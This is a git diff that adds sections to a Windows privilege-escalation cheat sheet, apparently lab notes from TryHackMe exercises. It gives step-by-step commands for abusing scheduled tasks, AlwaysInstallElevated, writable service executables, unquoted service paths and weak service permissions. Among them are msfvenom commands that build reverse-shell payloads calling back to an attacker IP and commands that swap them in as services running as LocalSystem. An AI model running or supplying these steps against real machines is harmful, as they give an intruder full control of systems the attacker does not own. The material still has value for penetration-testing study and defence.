@@ -549,3 +549,71 @@ Look for database passwd or user passwd in web.config: <br>
 Kind of SSH usually used on windows 
 
     reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+## Scheduled Tasks
+### List all scheduled tasks
+    schtasks
+### Details about a scheduled task
+    schtasks /query /tn <NAME_OF_THE_TASK> /fo list /v
+#### Example
+Folder: \ <br>
+HostName:                             THM-PC1 <br>
+TaskName:                             \vulntask<br>
+Task To Run:                          C:\tasks\schtask.bat<br>
+Run As User:                          taskusr1<br>
+#### Idea
+Like in Linux, see if you can modify or overwrite "Task to Run" by a malicious file
+### Check file permissions on the executable
+    icacls <FILE_PATH>
+### Run a scheduled task (not always possible)
+    schtasks /run /tn <TASK_NAME>
+
+## AlwaysInstallElevated
+Need to set 2 registry values to always install .msi with a high priviledged account, then install a malicious .msi
+### Set the registry values
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+### Generate the malicious .msi with msfvenom
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<LOCAL_PORT> -f msi -o malicious.msi
+### Execute the .msi on the windows machine 
+    msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+    
+## Windows Services
+### Check the apphostsvc service configuration
+    sc qc <SERVICE>
+### Check the services configurations 
+HKLM\SYSTEM\CurrentControlSet\Services\ <br>
+Look for a Discretionary Access Control List (DACL) in the "Security" subkey, we'd like to change it but only admin can<br>
+### Insecure Permissions on Service Executable
+If the executable of the service is modified by anyone, we gan replace it by a malicious one. <br>
+#### Step by Step
+##### Find the executable of the vulnarable service
+    sc qc <SERVICE>
+##### Get the permissions of the executable
+    icacls <SERVICE_EXECUTABLE_PATH>
+If Modifiable by us: <br>
+##### Generate a malicious exe-service payload with msfvenom
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe-service -o rev-svc.exe
+##### Change the executable by our executable
+    cd <DIRECTORY_OF_THE_EXECUTABLE>
+    move <SERVICE.EXE> <SERVICE.EXE.BKP>
+    move <MALICIOUS.EXE> <SERVICE.EXE>
+    icals <SERVICE.EXE> /grant Everyone:F
+##### Restart the service (or wait for it to restart on its own)
+    sc stop <SERVICE>
+    sc start <SERVICE>
+### Unquoted Service Paths    
+Force a service into running arbitrary executables <br>
+If the BINARY_PATH_NAME isn't quoted and contains spaces, it can be vulnerable. <br>
+If it is: <C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe> without quote, the Service Control Manage(SCM) will try to execute <C:\MyPrograms\Disk.exe> then <C:\MyPrograms\Disk Sorter.exe> and then <C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe>. <br>
+If we can create a file with path <C:\MyPrograms\Disk.exe> or <C:\MyPrograms\Disk Sorter.exe>, the SMC will execute it instead. <br>
+
+### Insecure Service Permissions
+If the Discretionary Access Control List (DACL) of the Service (not Service executable) is not well configurated, we could change the BINARY_PATH_NAME <br>
+#### Check service DACL
+Use Acesschk: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk <br>
+Go to dir of AccessChk and then: 
+
+    accesschk64.exe -qlc <SERVICE>
+#### Change Service's associated executable and account
+    sc config THMService binPath= <"C:\Users\thm-unpriv\rev-svc3.exe"> obj= <LocalSystem>
